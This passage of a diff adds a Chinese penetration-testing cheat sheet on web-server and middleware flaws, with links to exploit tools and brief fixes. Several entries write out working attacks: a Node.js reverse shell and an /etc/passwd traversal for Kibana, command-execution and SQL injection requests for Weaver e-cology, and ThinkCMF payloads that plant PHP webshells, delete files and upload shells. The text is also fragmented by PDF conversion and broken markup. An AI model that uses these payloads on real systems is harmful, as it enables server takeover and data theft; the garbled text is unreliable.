+    请求，在未授权的情况下远程执行命令，获得目标服务器的权限。也就
+    是说，攻击者能够直接获取服务器系统权限，进行数据窃取，进而甚至
+    会威胁受害者的内网安全。</p>
+</li>
+<li>
+<p>影响范围
+ Oracle WebLogic Server10.3.6.0.0
+    Oracle WebLogic Server12.1.3.0.0
+    Oracle WebLogic Server12.2.1.1.0
+    Oracle WebLogic Server12.2.1.3.0</p>
+</li>
+<li>
+<p>漏洞特征
+    /wls-wsat/CoordinatorPortType
+    /async/AsyncResponseService
+    /async/AsyncResponseServiceSoap12</p>
+</li>
+<li>
+<p>漏洞复现
+    WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）
+    <a href="https://blog.csdn.net/u013622866/article/details/104872747">https://blog.csdn.net/u013622866/article/details/104872747</a>
+      WebLogic-XMLDecoder反序列化分析
+    <a href="https://hu3sky.github.io/2019/10/16/weblogic/">https://hu3sky.github.io/2019/10/16/weblogic/</a></p>
+</li>
+<li>
+<p>利用工具
+      weblogicScanner
+      <a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a></p>
+</li>
+<li>
+<p>防护方法
+      通过访问策略控制禁止外部/_async/* 及 /wls-wsat/*路径的URL访问
+      删除对应war包并重启 webLogic
+      限制源IP对应 weblogic 7001端口的访问</p>
+</li>
+</ol>
+<h2 id="fastjson">Fastjson反序列化<a class="headerlink" href="#fastjson" title="Permanent link">&para;</a></h2>
+<h3 id="fastjson-1222-1224">Fastjson 1.2.22 - 1.2.24 反序列化漏洞<a class="headerlink" href="#fastjson-1222-1224" title="Permanent link">&para;</a></h3>
+<ol>
+<li>漏洞简介
+     FastJson是alibaba的一款开源JSON解析库，可用于将Java对象转换
+     为其JSON表示形式，也可以用于将JSON字符串转换为等效的Java对
+     象。fastjson在解析json的过程中，支持使用autoType来实例化某一个
+     具 体 的 类 ， 并 调 用 该 类 的 set/get 方 法 来 访 问 属 性 。 在 Java 
+     8u102环境下，没有com.sun.jndi.rmi.object.trustURLCodebase的限
+     制，可以使用com.sun.rowset.JdbcRowSetImpl的利用链，借助JNDI
+     注入来执行命令。</li>
+<li>影响范围
+     Fastjson 1.2.22 - 1.2.24</li>
+<li>漏洞特征
+     如果站点有原始报错回显，可以用不闭合花括号的方式进行报错回显，
+     报 错 中 往 往 会 有 fastjson 的 字 样 .(vulhub 环 境 不 适 用 ） 。 curl 
+     <a href="http://10.154.7.128:8090/">http://10.154.7.128:8090/</a> -H "Content-Type: application/json" --data 
+     '{"name":"success", "age":20'
+     可 以 通 过 DNS 回 显 的 方 式 检 测 后 端 是 否 使 用 Fastjson 。 curl 
+     <a href="http://10.154.7.128:8090/">http://10.154.7.128:8090/</a> -H "Content-Type: application/json" --data 
+     '{{"@type":"java.net.URL","val":"dnslog"}:0'
+   Java 系 Json 处理基本只有 Fastjson 和 Jackson，追加一个随机
+     key时jackson会报错。
+     对 使 用 fastjson 的 。 Fastjson &lt; 1.2.60 在 取 不 到 值 的 时 候 会 填 充
+     \u001a , 在 1.2.60 进 行 了 修 复 , 对 \x 
+     后 面 的 字 符 进 行 是 否 为 16 进 制 允 许 字 符 (0-9a-fA-F) 
+     的校验,所以这里就可以手动 padding ,构造一个特殊的字符串。</li>
+<li>漏洞复现
+     fastjson &lt;= 1.2.24 反序列化漏洞分析
+     <a href="https://www.secpulse.com/archives/73508.html">https://www.secpulse.com/archives/73508.html</a>
+   fastjson 1.2.24反序列化导致任意命令执行漏洞分析记录
+     <a href="https://www.cnblogs.com/tr1ple/p/11431543.html">https://www.cnblogs.com/tr1ple/p/11431543.html</a>
+   fastjson 1.2.24反序列化漏洞深度分析
+     <a href="https://www.anquanke.com/post/id/211035">https://www.anquanke.com/post/id/211035</a></li>
+<li>如何利用
+     <a href="https://mntn0x.github.io/2020/04/07/Fastjson%E6%BC%8F%E6%B">https://mntn0x.github.io/2020/04/07/Fastjson%E6%BC%8F%E6%B</a>
+     4%9E%E5%A4%8D%E7%8E%B0/</li>
+<li>防护方法
+     直接下载不受影响的新版本阿里官方已经发布公告，建议受影响的用户
+     立 刻 升 级 到 1.2.28/1.2.29 
+     或更高的版本，下载地址：<a href="http://repo1.maven.org/maven2/com/alib">http://repo1.maven.org/maven2/com/alib</a>
+     aba/fastjson/1.2.29/</li>
+</ol>
+<h2 id="struts">Struts系列漏洞<a class="headerlink" href="#struts" title="Permanent link">&para;</a></h2>
+<ol>
+<li>漏洞简介
+      Apache Struts2 作 为 世 界 上 最 流 行 的 Java Web 
+      服务器框架之一，从出现漏洞至今虽然有些年头，但是仍然没有消失。</li>
+<li>影响组件
+      Struts</li>
+<li>
+<p>漏洞复现
+      Struts2 历史 RCE 漏洞回顾不完全系列
+      <a href="https://rickgray.me/2016/05/06/review-struts2-remote-command">https://rickgray.me/2016/05/06/review-struts2-remote-command</a>￾execution-vulnerabilities/
+      浅谈struts2历史上的高危突破
+      <a href="https://www.anquanke.com/post/id/86757">https://www.anquanke.com/post/id/86757</a>
+   strut2各版本漏洞信息整理
+      <a href="https://www.zybuluo.com/Dukebf/note/821989">https://www.zybuluo.com/Dukebf/note/821989</a></p>
+</li>
+<li>
+<p>利用工具
+      HatBoy/Struts2-Scan
+      <a href="https://github.com/HatBoy/Struts2-Scan">https://github.com/HatBoy/Struts2-Scan</a>
+      Struts2奇葩环境任意文件上传工具
+      <a href="https://www.cnblogs.com/k8gege/p/10261217.html">https://www.cnblogs.com/k8gege/p/10261217.html</a></p>
+</li>
+<li>
+<p>防护方法
+      升级到最新版不建议使用Struts</p>
+</li>
+</ol>
+<h2 id="solr">Solr系列<a class="headerlink" href="#solr" title="Permanent link">&para;</a></h2>
+<ol>
+<li>组件描述
+      Apache 
+      Solr是一个高度可靠、可伸缩和容错的，提供分布式索引、复制和负载
+      平衡查询、自动故障转移和恢复、集中配置等功能的开源的搜索服务器
+      。Solr为世界上许多最大的互联网站点提供搜索和导航功能。Solr 使用
+      Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。Apache 
+      Solr 中 存 储 的 资 源 是 以 Document 
+      为对象进行存储的。每个文档由一系列的 Field 构成，每个 Field 
+      表 示 资 源 的 一 个 属 性 。 Solr 中 的 每 个 Document 
+      需要有能唯一标识其自身的属性，默认情况下这个属性的名字是
+      id，在 Schema 配置文件中使用：<uniqueKey>id</uniqueKey></li>
+<li>
+<p>影响组件
+      solr</p>
+</li>
+<li>
+<p>漏洞复现
+      Solr系列漏洞复现
+      <a href="https://www.jianshu.com/p/43e7f13e2058">https://www.jianshu.com/p/43e7f13e2058</a></p>
+</li>
+<li>利用工具
+      k8gege/SolrExp
+      <a href="https://github.com/k8gege/SolrExp">https://github.com/k8gege/SolrExp</a>
+      1135/solr_exploit
+      <a href="https://github.com/1135/solr_exploit">https://github.com/1135/solr_exploit</a></li>
+<li>防护方法
+      升级到最新版不要对外开放敏感端口</li>
+</ol>
+<h2 id="tomcat">Tomcat类<a class="headerlink" href="#tomcat" title="Permanent link">&para;</a></h2>
+<h3 id="tomcat-cve-2020-1938">Tomcat 本地文件包含漏洞 (CVE-2020-1938)<a class="headerlink" href="#tomcat-cve-2020-1938" title="Permanent link">&para;</a></h3>
+<ol>
+<li>
+<p>漏洞简介
+      Tomcat 是 常 见 的 Web 容 器 , 用 户 量 非 常 巨 大 , Tomcat 8009 
+      ajp端口一直是默认开放的</p>
+</li>
+<li>
+<p>影响范围
+      Apache Tomcat 6
+      Apache Tomcat 7 &lt; 7.0.100
+      Apache Tomcat 8 &lt; 8.5.51
+      Apache Tomcat 9 &lt; 9.0.31</p>
+</li>
+<li>
+<p>漏洞特征
+      tomcat/8009/ajp
+   \x04\x01\xf4\x00\x15</p>
+</li>
+<li>
+<p>漏洞复现
+      CVE-2020-1938 幽 灵 猫 ( GhostCat ) Tomcat-Ajp 
+      协议任意文件读取/JSP文件包含漏洞分析
+      <a href="https://www.guildhab.top/?p=2406">https://www.guildhab.top/?p=2406</a>
+      Apache Tomcat文件包含漏洞分析
+      <a href="https://yinwc.github.io/2020/03/01/CVE-2020-1938/">https://yinwc.github.io/2020/03/01/CVE-2020-1938/</a>
+      CVE-2020-1938:Tomcat AJP协议文件包含漏洞分析
+      <a href="http://gv7.me/articles/2020/cve-2020-1938-tomcat-ajp-lfi/">http://gv7.me/articles/2020/cve-2020-1938-tomcat-ajp-lfi/</a></p>
+</li>
+<li>检测工具
+      bkfish/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner
+      <a href="https://github.com/bkfish/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/bkfish/CNVD-2020-10487-Tomcat-Ajp-lfi</a>￾Scanner
+      长亭科技检测工具
+      <a href="https://www.chaitin.cn/zh/ghostcat#download">https://www.chaitin.cn/zh/ghostcat#download</a></li>
+<li>防护方法
+      更新为最新版本
+      若 不 需 要 使 用 Tomcat AJP 协 议 ， 可 直 接 关 闭 AJP 
+      Connector，或将其监听地址改为仅监听本机localhost。
+      CVE-2020-9484 tomcat </li>
+</ol>
+<h3 id="session">session反序列化漏洞分析<a class="headerlink" href="#session" title="Permanent link">&para;</a></h3>
+<ol>
+<li>
+<p>漏洞简介
+      Apache 
+      Tomcat发布通告称修复了一个源于持久化Session的远程代码执行漏洞
+      （CVE-2020-9484）。
+      漏洞条件比较苛刻：
+      tomcat必须启用session持久化功能FileStore
+      tomcat/lib 或 者 WEB-INF/lib 目 录 下 的 依 赖 存 在 可 用 的 gadget 3. 
+      在服务器上存在已知路径文件内容可控</p>
+</li>
+<li>
+<p>影响范围
+      Apache Tomcat 10.x &lt; 10.0.0-M5
+      Apache Tomcat 9.x &lt; 9.0.35
+      Apache Tomcat 8.x &lt; 8.5.55
+      Apache Tomcat 7.x &lt; 7.0.104</p>
+</li>
+<li>
+<p>漏洞依赖条件
+      配置session持久化
+      conf/context.xml
+      部署Gadgets jar包
+      下载commons-collections4-4.0.jar 并放在tomcat lib/目录下</p>
+</li>
+<li>
+<p>漏洞复现
+      CVE-2020-9484 tomcat session反序列化漏洞分析与复现
+      <a href="https://www.cnblogs.com/potatsoSec/p/12931427.html">https://www.cnblogs.com/potatsoSec/p/12931427.html</a>
+      CVE-2020-9484 tomcat session反序列化漏洞分析与复现
+      <a href="https://blog.csdn.net/Jietewang/article/details/106462903">https://blog.csdn.net/Jietewang/article/details/106462903</a></p>
+</li>
+<li>
+<p>漏洞利用
+      tomcat-cluster-session-sync-exp
+      <a href="https://github.com/threedr3am/tomcat-cluster-session-sync-exp">https://github.com/threedr3am/tomcat-cluster-session-sync-exp</a></p>
+</li>
+<li>
+<p>防护方法
+      Apache 
+      Tomcat官方已经发布新版本修复上述漏洞，建议受影响用户尽快升级
+      进行防护。不方便升级的用户，还可以暂时禁用FileStore功能，或者
+      单独配置sessionAttributeValueClassNameFilte的值来确保只有特定
+      属性的对象可以被序列化/反序列化。</p>
+</li>
+</ol>
+<h2 id="redis">Redis相关<a class="headerlink" href="#redis" title="Permanent link">&para;</a></h2>
+<ol>
+<li>
+<p>漏洞简介
+      部分 Redis 绑定在 0.0.0.0:6379 ，并且没有开启认证（这是 Redis 
+      的默认配置），如果没有进行采用相关的策略，比如添加防火墙规则避
+      免 其 他 非 信 任 来 源 ip 访 问 等 ， 将 会 导 致 Redis 
+      服务直接暴露在公网上，导致其他用户可以直接在非授权情况下直接访
+      问 Redis 服务并进行相关操作。利用 Redis 自身的提供的 config 
+      命令，可以进行写文件操作，攻击者可以成功将自己的公钥写入目标服
+      务 器 的 /root/.ssh 文 件 夹 的 authotrized_keys 
+      文件中，进而可以直接使用对应的私钥登录目标服务器。</p>
+</li>
+<li>
+<p>影响组件
+      Redis</p>
+</li>
+<li>
+<p>漏洞特征
+      6379端口</p>
+</li>
+<li>
+<p>漏洞复现
+      Redis 未授权访问漏洞利用总结
+      <a href="http://www.alloyteam.com/2017/07/12910/">http://www.alloyteam.com/2017/07/12910/</a>
+      Redis未授权访问漏洞总结
+      <a href="https://fragrant10.github.io/2019/02/13/Redis%E6%9C%AA%E6%8">https://fragrant10.github.io/2019/02/13/Redis%E6%9C%AA%E6%8</a>
+      E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6
+      %B4%9E%E6%80%BB%E7%BB%93.html</p>
+</li>
+<li>
+<p>复现坑点分析
+      redis漏洞利用
+      <a href="https://www.jianshu.com/p/2f56a58a1450">https://www.jianshu.com/p/2f56a58a1450</a>
+      redis 4.x/5.x未授权访问漏洞（以及一些环境搭建的坑）(7月18更新）
+      <a href="http://www.mucn.site/index.php/Termux/210.html">http://www.mucn.site/index.php/Termux/210.html</a></p>
+</li>
+<li>
+<p>防护方法
+      redis数据库漏洞防护
+      <a href="https://www.cnblogs.com/rinack/p/11099854.html">https://www.cnblogs.com/rinack/p/11099854.html</a>
+      redis未授权访问漏洞的利用和防护
+      <a href="https://carey.akhack.com/2020/05/07/Redis%E6%9C%AA%E6%8E">https://carey.akhack.com/2020/05/07/Redis%E6%9C%AA%E6%8E</a>
+      %88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%
+      B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9
+      %98%B2%E6%8A%A4/</p>
+</li>
+</ol>
+<h2 id="zabbix">Zabbix相关<a class="headerlink" href="#zabbix" title="Permanent link">&para;</a></h2>
+<ol>
+<li>
+<p>漏洞简介
+      Zabbix组件主要存在注入/弱口令/命令执行等类型的漏洞。</p>
+</li>
+<li>
+<p>影响组件
+      Zabbix</p>
+</li>
+<li>
+<p>漏洞复现：
+      信息收集 - Zabbix - 漏洞 - 汇总
+      <a href="https://www.cnblogs.com/AtesetEnginner/p/12641747.html">https://www.cnblogs.com/AtesetEnginner/p/12641747.html</a>
+      Zabbix（分布式系统监视）漏洞学习
+      <a href="https://www.jianshu.com/p/85e3b0266158">https://www.jianshu.com/p/85e3b0266158</a>
+      记一次zabbix安装及漏洞利用getshell全过程
+      <a href="https://xz.aliyun.com/t/6874">https://xz.aliyun.com/t/6874</a>
+      Zabbix 最新 SQL 注入漏洞及 EXP – Jamin Zhang
+      <a href="https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection">https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection</a>￾Vulnerability-and-EXP/
+      最新Zabbix漏洞及其利用姿势（附EXP）
+      <a href="https://zhuanlan.zhihu.com/p/22082375">https://zhuanlan.zhihu.com/p/22082375</a></p>
+</li>
+<li>
+<p>防护方法
+      <a href="https://www.bbsmax.com/A/QV5ZqlDeJy/">https://www.bbsmax.com/A/QV5ZqlDeJy/</a></p>
+</li>
+</ol>
+<h2 id="jenkins">Jenkins相关<a class="headerlink" href="#jenkins" title="Permanent link">&para;</a></h2>
+<ol>
+<li>
+<p>漏洞简介
+      Jenkins 是 常 见 的 CI/CD 服 务 器 , 
+      最常见的就是爆破弱口令然后使用groovy执行命令</p>
+</li>
+<li>
+<p>影响组件
+      Jenkins</p>
+</li>
+<li>
+<p>漏洞特征
+      Jenkins</p>
+</li>
+<li>
+<p>漏洞复现
+      Jenkins漏洞集合复现
+      <a href="https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4">https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4</a>
+      %9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/
+      Jenkins任意文件读取漏洞分析
+      <a href="https://www.freebuf.com/news/178808.html">https://www.freebuf.com/news/178808.html</a></p>
+</li>
+<li>
+<p>漏洞利用
+      blackye/Jenkins: Jenkins漏洞探测、用户抓取爆破
+      <a href="https://github.com/blackye/Jenkins">https://github.com/blackye/Jenkins</a>
+      gquere/pwn_jenkins: Notes about attacking Jenkins servers
+      <a href="https://github.com/gquere/pwn_jenkins">https://github.com/gquere/pwn_jenkins</a>
+      Jenkins脏牛漏洞FRP内网提权
+      <a href="https://www.freebuf.com/articles/web/215183.html">https://www.freebuf.com/articles/web/215183.html</a></p>
+</li>
+<li>
+<p>利用技巧
+      可 以 在 Jenkins 处 进 行 内 网 信 息 收 集 , 
+      获取的账号通常也是开发/运维级别的, 权限相对较大。</p>
+</li>
+<li>
+<p>防护方法
+      设置强口令尽量不要开放到公网限制来源IP升级到最新版</p>
+</li>
+</ol>
+<h2 id="kibana">Kibana相关<a class="headerlink" href="#kibana" title="Permanent link">&para;</a></h2>
+<h3 id="kibanacve-2019-7609">Kibana远程代码执行漏洞(CVE-2019-7609)<a class="headerlink" href="#kibanacve-2019-7609" title="Permanent link">&para;</a></h3>
+<ol>
+<li>
+<p>漏洞简介
+      Kibana 是为 Elasticsearch设计的开源分析和可视化平台。你可以使用
+      Kibana 来 搜 索 ， 查 看 存 储 在 Elasticsearch 
+      索引中的数据并与之交互。你可以很容易实现高级的数据分析和可视化
+      ，以图标的形式展现出来。
+      攻击者利用漏洞可以通过Timelion组件中的JavaScript原型链污染攻击
+      ，向Kibana发起相关请求，从而接管所在服务器，在服务器上执行任
+      意命令。</p>
+</li>
+<li>
+<p>影响版本
+      Kibana &lt; 6.6.1
+      Kibana &lt; 5.6.15</p>
+</li>
+<li>
+<p>检测方法
+      文中给出了POC
+      <a href="https://dylan903.github.io/2019/10/20/kibana-rce-lou-dong-fu-xian/">https://dylan903.github.io/2019/10/20/kibana-rce-lou-dong-fu-xian/</a></p>
+</li>
+<li>
+<p>漏洞复现
+      CVE-2019-7609 Kibana远程代码执行漏洞攻击方法和漏洞原理分析
+      <a href="https://cloud.tencent.com/developer/article/1535121">https://cloud.tencent.com/developer/article/1535121</a>
+      CVE-2019-7609 Kibana 代码执行漏洞复现
+      <a href="http://blog.leanote.com/post/snowming/2cd6256df61d">http://blog.leanote.com/post/snowming/2cd6256df61d</a></p>
+</li>
+<li>
+<p>漏洞利用
+      jas502n/kibana-RCE
+      <a href="https://github.com/jas502n/kibana-RCE">https://github.com/jas502n/kibana-RCE</a></p>
+</li>
+<li>
+<p>坑点
+      部 署 过 程 中 如 果 出 现 Kibana server is not ready 
+      yet,那么你是需要确定下 你的kibana与elasticsearch版本是否一致
+      es要用非root用户启动，否则会报can not run elasticsearch as 
+      root错误。</p>
+</li>
+<li>
+<p>防御方法
+      升级Kibana至新版本</p>
+</li>
+</ol>
+<h3 id="kibanacve-2018-17246">Kibana漏洞CVE-2018-17246<a class="headerlink" href="#kibanacve-2018-17246" title="Permanent link">&para;</a></h3>
+<ol>
+<li>
+<p>漏洞简介
+      此漏洞出现在Kibana控制台（Console）插件中，控制台插件是KIban
+      a的基本插件，也就是Kibana必装的插件。当前elastic最新版本为6.5
+      ，可以说大部分elk的组件会存在此问题，但是此问题利用难点在于如
+      何创建一个恶意的本地文件。</p>
+</li>
+<li>
+<p>影响版本
+      ElasticSearch Kibana &lt; 6.4.3
+      ElasticSearch Kibana &lt; 5.6.13</p>
+</li>
+<li>
+<p>利用方法
+      读文件操作
+      <a href="http://192.168.1.3:5601/api/console/api_server?sense_version=%4">http://192.168.1.3:5601/api/console/api_server?sense_version=%4</a>
+      0%40SENSE_VERSION&amp;apis=../../../../../../../../../../../etc/passwd
+      反弹shell在kibana的机器创建 /tmp/shell.js</p>
+</li>
+<li>
+<p>(function(){ var net = require("net"), cp = 
+      require("child_process"), sh = cp.spawn("/bin/sh", []); var
+      client = new net.Socket(); client.connect(8080, 
+      "192.168.1.2", function(){ client.pipe(sh.stdin); 
+      sh.stdout.pipe(client); sh.stderr.pipe(client); }); return
+      /a/; })();
+      请求包含刚刚创建的shell：
+      <a href="http://192.168.1.3:5601/api/console/api_server?sense_version=%4">http://192.168.1.3:5601/api/console/api_server?sense_version=%4</a>
+      0%40SENSE_VERSION&amp;apis=../../../../../../../../../../../tmp/shell.js</p>
+</li>
+<li>
+<p>本地监听：
+      nc -l 8080 -v</p>
+</li>
+<li>
+<p>漏洞复现
+      Elasticsearch 核心插件Kibana 本地文件包含漏洞分析（CVE-2018-
+      17246）
+      <a href="https://www.anquanke.com/post/id/168291">https://www.anquanke.com/post/id/168291</a>
+      ELK LFI CVE-2018-17246
+      <a href="https://wh0ale.github.io/2018/12/18/2018-12-18-">https://wh0ale.github.io/2018/12/18/2018-12-18-</a>
+      ELK%20LFI%20CVE-2018-17246/</p>
+</li>
+<li>
+<p>坑点
+      最终漏洞的影响关键在于如何创建shell文件。</p>
+</li>
+<li>
+<p>修复建议
+      目前厂商已发布升级补丁以修复漏洞，补丁获取链接:
+      <a href="https://access.redhat.com/security/cve/cve-2018-17246">https://access.redhat.com/security/cve/cve-2018-17246</a></p>
+</li>
+</ol>
+<h2 id="oa">泛微OA相关<a class="headerlink" href="#oa" title="Permanent link">&para;</a></h2>
+<h3 id="oa_1">泛微OA系统多版本存在命令执行漏洞<a class="headerlink" href="#oa_1" title="Permanent link">&para;</a></h3>
+<ol>
+<li>漏洞简介
+      泛微OA办公系统是一款协调办公软件。
+      泛微协同商务软件系统存在命令执行漏洞，攻击者可利用该漏洞获取服
+      务器权限。</li>
+<li>影响范围
+      泛微 e-cology&lt;=9.0</li>
+<li>漏洞复现
+      <a href="https://www.cnblogs.com/Sylon/p/11765543.html">https://www.cnblogs.com/Sylon/p/11765543.html</a></li>
+<li>Poc
+      漏洞路径:/weaver/bsh.servlet.BshServlet
+      exec("whoami")curl 
+      <a href="http://xx.xx.xx.xx.xx/weaver/bsh.servlet.BshServlet/">http://xx.xx.xx.xx.xx/weaver/bsh.servlet.BshServlet/</a> -d 
+      'bsh.script=eval%00("ex"%2b"ec("whoami")");&amp;bsh.servlet.capture
+      OutErr=true&amp;bsh.servlet.outp ut=raw'</li>
+<li>批量检测工具
+      <a href="https://github.com/sunird/e-cology-poc">https://github.com/sunird/e-cology-poc</a></li>
+<li>防护方法
+      屏蔽/weaver/*目录的访问；
+      <a href="https://www.weaver.com.cn/cs/securityDownload.asp">https://www.weaver.com.cn/cs/securityDownload.asp</a></li>
+</ol>
+<h3 id="e-cology-oasql">泛微E-cology OA系统SQL注入漏洞<a class="headerlink" href="#e-cology-oasql" title="Permanent link">&para;</a></h3>
+<ol>
+<li>漏洞简介
+      泛 微 e-cology 
+      OA系统的WorkflowCenterTreeData接口在使用Oracle数据库时,由于
+      内 置 SQL 语 句 拼 接 不 严 , 导 致 泛 微 e-cology 
+      OA系统存在SQL注入漏洞。攻击者利用该漏洞，可在未授权的情况下
+      ，远程发送精心构造的SQL语句，从而获取数据库敏感信息。</li>
+<li>影响范围
+      泛微e-cology&lt;=9.0</li>
+<li>漏洞复现
+      泛微生态OA系统SQL注入扩展复现
+      <a href="https://mumuka.gitee.io/passages/%E6%B3%9B%E5%BE%AEe">https://mumuka.gitee.io/passages/%E6%B3%9B%E5%BE%AEe</a>￾cology%20OA%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%
+      E6%B4%9E%E5%A4%8D%E7%8E%B0/
+      泛微 e-cology OA 前台SQL注入漏洞复现
+      <a href="https://cloud.tencent.com/developer/article/1521764">https://cloud.tencent.com/developer/article/1521764</a></li>
+<li>简易poc
+      POST 
+      /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;sco
+      pe=2333 HTTP/1.1
+      Host: ip:port
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) 
+      Gecko/20100101 Firefox/56.0
+      Accept: 
+      text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+      Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+      Accept-Encoding: gzip, deflateContent-Type: application/x-www￾form-urlencoded
+      Content-Length: 2236
+      Connection: close
+      Upgrade-Insecure-Requests: 1
+      formids=11111111111)))%0a%0dunion select NULL,value from 
+      v$parameter order by (((1</li>
+<li>利用工具
+      AdministratorGithub/e-cology-OA-SQL
+      <a href="https://github.com/AdministratorGithub/e-cology-OA-SQL">https://github.com/AdministratorGithub/e-cology-OA-SQL</a>
+   mmioimm/ecology_test
+      <a href="https://github.com/mmioimm/ecology_test">https://github.com/mmioimm/ecology_test</a></li>
+<li>防护方法
+      及时打补丁
+      泛微官方安全补丁：<a href="https://www.weaver.com.cn/cs/securityDownloa">https://www.weaver.com.cn/cs/securityDownloa</a>
+      d.asp
+      Thinkcmf相关
+      前台SQL注入:</li>
+<li>依赖条件
+      需要普通用户权限，默认可注册</li>
+<li>payload：
+   <code>POST /ThinkCMFX/index.php?g=portal&amp;m=article&amp;a=edit_post</code> 
+   <code>HTTP/1.1</code>
+   <code>Host: localhost</code>
+   <code>Connection: close</code>
+   <code>Cookie: PHPSESSID=kcg5v82ms3v13o8pgrhh9saj95</code>
+   <code>Content-Type: application/x-www-form-urlencoded</code>
+   <code>Content-Length: 79</code>
+    <code>postid=bind&amp;postid=0 and updatexml(1,</code> 
+   <code>concat(0x7e,user(),0x7e),1)--+-</code>
+   <strong>前台模版注入漏洞</strong>-可getshell四处
+   （仅在windows环境下设置）
+   第一处
+   <a href="http://website/ThinkCMFX/index.php?g=Comment&amp;m=Widget&amp;a=fetch">http://website/ThinkCMFX/index.php?g=Comment&amp;m=Widget&amp;a=fetch</a>&amp;
+   templateFile=/../public/index&amp;content=&lt;%3fphp+file_put_contents('m.p
+   hp','&lt;%3fphp+eval(<span class="arithmatex"><span class="MathJax_Preview">POST[])%3b');?&gt;&amp;prefix=
+   第 二 处
+    http://website/ThinkCMFX/index.php?g=Api&amp;m=Plugin&amp;a=fetch&amp;templ
+   ateFile=/../../../public/index&amp;content=&lt;%3fphp+file_put_contents('m.php','&lt;%3fphp+eval(</span><script type="math/tex">POST[])%3b');?>&prefix=
+   第 二 处
+    http://website/ThinkCMFX/index.php?g=Api&m=Plugin&a=fetch&templ
+   ateFile=/../../../public/index&content=<%3fphp+file_put_contents('m.php','<%3fphp+eval(</script></span>POST[])%3b');?&gt;&amp;prefix=
+   第 三 处
+    /index.php?a=fetch&amp;templateFile=public/index&amp;prefix=''&amp;content=&lt;php file_put_contents('test.php','&lt;?php phpinfo(); ?&gt;')</php>
+   第四处/index.php?a=fetch&amp;content=&lt;?php+file_put_contents("mrxn.php", base64_decode("PD9waHAgZXZhbCgkX1BPU1RbIjAwMCJdKTs/Pg==
+   "));
+   <strong>任意文件删除</strong>-只能windows删除
+   在用户上传头像处存在任意文件删除漏洞，发送如下数据包后，会删除网
+   站根目录下一个名为 test.txt 的文件。（该漏洞仅能在 Windows 下触发）
+   <code>POST /ThinkCMFX/index.php?g=User&amp;m=Profile&amp;a=do_avatar&amp;</code> 
+   <code>HTTP/1.1</code>
+   <code>Host: localhost</code>
+   <code>Cookie: PHPSESSID=bggit7phrb1dl99pcb2lagbmq0;</code>
+   <code>Connection: close</code>
+   <code>Content-Type: application/x-www-form-urlencoded</code>
+   <code>Content-Length: 27</code>
+   <code>imgurl=......\test.txt</code>
+   <strong>任意文件上传</strong>
+   在 ThinkCMFX2.2.3 
+   最终版中，存在一处任意文件上传（需要普通用户权限，默认可注册）
+   curl -F "file=@/tmp/shell.php" -X "POST" -b 
+   'PHPSESSID=qekmttucmue6vv41kpdjghnkd0;' 
+   '<a href="http://127.0.0.1/ThinkCMFX/index.php?g=Asset&amp;m=Ueditor&amp;a=upload">http://127.0.0.1/ThinkCMFX/index.php?g=Asset&amp;m=Ueditor&amp;a=upload</a>
+   &amp;action=uploadfile'
+   <strong>任意文件包含</strong>（读取数据库配置等等）
+   /index.php?a=display&amp;templateFile=README.md</li>
+</ol>
+<h2 id="vpn">深信服VPN相关<a class="headerlink" href="#vpn" title="Permanent link">&para;</a></h2>
+<ol>
+<li>漏洞简介
+   深信服 VPN 某个特定产品存在远程代码执行, 2019 攻防演练使用过</li>
+<li>影响组件
+   深信服 VPN</li>
+<li>
+<p>漏洞指纹
+   Set-Cookie: TWFID=welcome to ssl vpn Sinfor</p>
+</li>
+<li>
+<p>Fofa Dork
+   header="Set-Cookie: TWFID="</p>
+</li>
+<li>
+<p>漏洞分析
+   深信服vpnweb登录逆向学习 – potatso – 博客园
+   <a href="https://www.cnblogs.com/potatsoSec/p/12326356.html">https://www.cnblogs.com/potatsoSec/p/12326356.html</a></p>
+</li>
+<li>
+<p>漏洞利用
+   （简单的命令注入）
+   wget -t %d -T %d --spider %s</p>
+</li>
+<li>
+<p>利用技巧
+   该 版 本 深 信 服 VPN 属 于 相 对 早 期 的 版 本 , 大 概 2008 年 左 右 , 
+   但目前还有761个ip开放在公网
+   该 版 本 较 低 , whomai 不 存 在 , 可 以 使 用 uname, 
+   这里没有空格可dns传出来
+   去除空格也简单 cat /etc/passwd | tr " \n" "+|"</p>
+</li>
+<li>
+<p>防护方法
+   及时更新补丁升级到最新版
+   Thinkphp相关
+   ThinkPHP3.2.3_缓存函数设计缺陷可导致Gets
+   hell</p>
+</li>
+<li>
+<p>影响版本
+   &lt;= 3.2.3</p>
+</li>
+<li>
+<p>漏洞复现
+   <a href="https://xz.aliyun.com/t/99">https://xz.aliyun.com/t/99</a>
+   <a href="https://xz.aliyun.com/t/99">https://xz.aliyun.com/t/99</a>
+   ThinkPHP3.2.3_最新版update注入漏洞</p>
+</li>
+<li>
+<p>影响版本
+   &lt;= 3.2.3</p>
+</li>
+<li>
+<p>漏洞复现
+   <a href="https://www.anquanke.com/post/id/104847">https://www.anquanke.com/post/id/104847</a>
+   ThinkPHP3.2.X_find_select_delete注入</p>
+</li>
+<li>
+<p>影响版本
+   &lt;= 3.2.3
+    2.漏洞复现
+    <a href="https://xz.aliyun.com/t/2631https://xz.aliyun.com/t/2629">https://xz.aliyun.com/t/2631https://xz.aliyun.com/t/2629</a>
+   ThinkPHP3.X_order_by注入漏洞</p>
+</li>
+<li>
+<p>影响版本
+   &lt;= 3.2.3</p>
+</li>
+<li>
+<p>漏洞复现
